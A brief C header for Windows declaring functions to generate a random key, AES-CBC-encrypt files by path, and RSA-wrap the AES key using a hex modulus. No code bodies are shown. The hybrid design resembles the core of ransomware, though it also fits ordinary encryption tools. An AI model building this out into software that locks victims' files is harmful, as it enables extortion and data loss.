#ifndef AES_H
#define AES_H

#include <windows.h>

int generate_random_key(unsigned char *key, size_t key_len);
int encrypt_file_aes_cbc(const char *filepath, const unsigned char *key);
int encrypt_aes_key_with_rsa(const unsigned char *aes_key, size_t aes_key_len, const char *rsa_n_hex, unsigned char **encrypted_key, size_t *encrypted_len);

#endif // AES_H
